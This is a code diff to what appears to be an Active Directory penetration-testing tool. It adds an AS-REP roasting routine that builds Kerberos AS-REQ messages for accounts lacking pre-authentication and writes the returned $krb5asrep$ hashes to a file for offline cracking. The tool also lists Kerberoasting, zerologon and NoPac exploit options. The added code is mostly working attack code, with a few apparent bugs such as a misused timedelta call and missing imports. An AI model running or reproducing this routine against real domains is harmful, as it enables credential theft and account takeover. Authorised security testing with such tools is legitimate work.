@@ -2,11 +2,11 @@
 # -*- coding: utf-8 -*-
 try:
 	#module imports
-	import argparse, ldap3, json, re, sys, socket, textwrap
+	import argparse, ldap3, json, re, random, sys, socket, textwrap
 
 	#other imports
 	from binascii import hexlify, unhexlify
-	from datetime import datetime
+	from datetime import datetime, timedelta
 	from getpass import getpass
 	from impacket.krb5.kerberosv5 import KerberosError
 	from impacket.krb5.types import Principal
@@ -20,11 +20,15 @@ try:
 	from impacket.nmb import NetBIOSTimeout, NetBIOSError	
 	from impacket.dcerpc.v5 import transport
 	from impacket import smbconnection
+	from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
+	from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+	from impacket.krb5.types import KerberosTime, Principal
 	from ldap3 import SUBTREE, ALL_ATTRIBUTES 
 	from ldap3.core.exceptions import LDAPBindError, LDAPException	
 	from netaddr import *
 	from pprint import pprint
-	from pyasn1.codec.der import decoder
+	from pyasn1.codec.der import decoder, encoder
+	from pyasn1.type.univ import noValue
 	from pyfiglet import Figlet
 	from rich.console import Console, Theme
 	from time import sleep
@@ -99,8 +103,9 @@ class Connect (object):
 #Enumeration Class
 class EnumerateAD(object):
 
-	def __init__(self, server, conn, kerberoast, smb, fuzz, domain, username, password, dc_ip, status, large, root=None):
+	def __init__(self, server, conn, kerberoast, smb, fuzz, domain, username, password, dc_ip, status, large, asrep, root=None):
 		
+		self.asrep = asrep
 		self.large = large
 		self.status = status
 		self.domain = domain
@@ -114,6 +119,8 @@ class EnumerateAD(object):
 		self.conn = conn
 		self.computers = []
 		self.spn = []   
+		self.users = []
+
 		if root is None:
             		self.root = self.getRoot()
 		else:
@@ -314,6 +321,7 @@ class EnumerateAD(object):
 			
 	#Get domain policies		
 	def getDomainPolicy(self):
+
 		try:
 			domainpolicies = []
 			self.status.update("[bold white]Finding domain policies...")
@@ -328,13 +336,14 @@ class EnumerateAD(object):
 				domainpolicies.append({
 					print(f'[+] {name} \n'),
 				})
-			print('')
-			console.print('[-] Found {0} Domain policies'.format(len(self.conn.entries)), style = "info")
-			print('')
+			
 			if MachineAccountQuota < 0:
         			console.print("[-] Not vulnerable, cannot proceed with Machine creation")
 			else:
 				console.print ("[!] Vulnerability: Possible Attack Vector, can be exploited further.", style = "error")
+			print('')
+			console.print('[-] Found {0} Domain policies'.format(len(self.conn.entries)), style = "info")
+			print('')
 
 		except LDAPException as e:
 			console.print ("[-] Warning: No Admins found", style = "warning")
@@ -355,7 +364,7 @@ class EnumerateAD(object):
 	
 		try:	
 			unconstrained = []
-			self.status.update("[bold white]Finding Users with unconstrained delegation...")
+			self.status.update("[bold white]Finding Users with Unconstrained Delegation...")
 			sleep(1)
 			console.rule("[bold red]Unconstrained Delegation")
 			self.conn.search('%s' % (self.root), search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', attributes=["sAMAccountName"],  size_limit=0)
@@ -430,7 +439,6 @@ class EnumerateAD(object):
 		self.status.update("[bold white]Finding Users that dont require Kerberos Pre-Authentication...")
 		sleep(1)
 		# Build user array
-		users = []
 		console.rule("[bold red]AS-REP Roastable Users")
 		self.conn.search('%s' % (self.root), search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
 				attributes=["cn", "objectSid", "sAMAccountName"], search_scope=SUBTREE)
@@ -439,12 +447,15 @@ class EnumerateAD(object):
 			asRepObj.append({
 				print(f'[+] {name} \n'),
 			})
-			users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.domain))
+			self.users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.domain))
 		if len(self.conn.entries) >= 1:
 			console.print ("[!] Vulnerability: Domain users vulnerable to AS-REP Roasting", style = "error")
 			print('')
 		console.print('[-] Found {0} account(s) that dont require pre-authentication'.format(len(self.conn.entries)), style = "info")
-		print('')
+		if self.asrep:
+				ExploitAD.ASREPRoast(self.users, self.domain, self.status)
+		else:	
+			sys.exit(1)
 		
 	#Fuzz AD with ANR (Ambiguous Name Resolution)
 	def searchRandom(self, fobject, objectCategory=''):
@@ -465,7 +476,8 @@ class EnumerateAD(object):
 			pprint ("[-] Error: {}".format(e))
 			sys.exit(1)  
 			
-	def get_user_info(samname):
+	def get_user_info(self, samname):
+
 		self.conn.search(self.dc_search[:-1], '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid','ms-DS-MachineAccountQuota'])
 		try:
 			et = self.conn.entries[0]
@@ -475,6 +487,7 @@ class EnumerateAD(object):
 			return False
 	
 	def sortComputers(self):
+
 		for computer in self.computers:
 		    try:
 		        self.smbShareCandidates.append(computer['dNSHostName'])
@@ -736,6 +749,81 @@ class ExploitAD(object):
 		except KerberosError as err:
 			console.print('Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
 			sys.exit(1)
+
+	#ASREPRoast
+	def ASREPRoast(users, domain, status):
+
+		status.update(status="[bold white]ASREP Roasting...")
+		sleep(1)
+		console.rule("[bold red]ASREP Roasting")
+
+		# Build user array
+		hashes = []
+		# Build request for Tickets
+		for usr in users:
+			clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			asReq = AS_REQ()
+			Domain = str(domain).upper()
+			serverName = Principal('krbtgt/{0}'.format(Domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			pacReq = KERB_PA_PAC_REQUEST()
+			pacReq['include-pac'] = True
+			encodedPacReq = encoder.encode(pacReq)
+			asReq['pvno'] = 5
+			asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+			asReq['padata'] = noValue
+			asReq['padata'][0] = noValue
+			asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+			asReq['padata'][0]['padata-value'] = encodedPacReq
+
+			requestBody = seq_set(asReq, 'req-body')
+
+			options = list()
+			options.append(constants.KDCOptions.forwardable.value)
+			options.append(constants.KDCOptions.renewable.value)
+			options.append(constants.KDCOptions.proxiable.value)
+			requestBody['kdc-options'] = constants.encodeFlags(options)
+
+			seq_set(requestBody, 'sname', serverName.components_to_asn1)
+			seq_set(requestBody, 'cname', clientName.components_to_asn1)
+
+			requestBody['realm'] = Domain
+
+			now = datetime.utcnow() + datetime.timedelta(days=1)
+			requestBody['till'] = KerberosTime.to_asn1(now)
+			requestBody['rtime'] = KerberosTime.to_asn1(now)
+			requestBody['nonce'] = random.getrandbits(31)
+
+			supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+
+			seq_set_iter(requestBody, 'etype', supportedCiphers)
+
+			msg = encoder.encode(asReq)
+
+			try:
+				response = sendReceive(msg, Domain, domain)
+			except KerberosError as e:
+				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+					seq_set_iter(requestBody, 'etype', supportedCiphers)
+					msg = encoder.encode(asReq)
+					response = sendReceive(msg, Domain, domain)
+				else:
+					print(e)
+					continue
+
+			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
+
+			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, Domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
+
+		if len(hashes) > 0:
+			with open('{0}-jtr-hashes'.format(domain), 'w') as f:
+				for h in hashes:
+					f.write(str(h) + '\n')
+
+			print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(domain))
+		else:
+			print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')
+
 		
 #function for lumberjack title art
 def titleArt():
@@ -770,6 +858,7 @@ def main():
 	parser.add_argument('-large', help='For Active Directories with over 1000 users', action='store_true')
 	parser.add_argument('-e', '--exploit', type=str, help='run exploit features: 1 = zerologon, 2 = NoPac')
 	parser.add_argument('-krb', '--kerberoast', help='Run Kerberoasting', action='store_true')
+	parser.add_argument('-asrep', help='AS-REP Roasting', action='store_true')
 	parser.add_argument('-smb', '--smb', help='enumerate SMB shares', action='store_true')
 	parser.add_argument('-f', '--fuzz', type=str)
 	args = parser.parse_args()
@@ -848,7 +937,7 @@ def main():
 
 	#Run main features
 	try:
-		enumAD = EnumerateAD(s, c, args.kerberoast, args.smb, args.fuzz, domain, username, password, dc_ip, status, args.large)
+		enumAD = EnumerateAD(s, c, args.kerberoast, args.smb, args.fuzz, domain, username, password, dc_ip, status, args.large, args.asrep)
 		if not pwdres:
 			print('')
 			console.print("[!] Vulnerability: Active Directory has a weak password policy", style = "error")
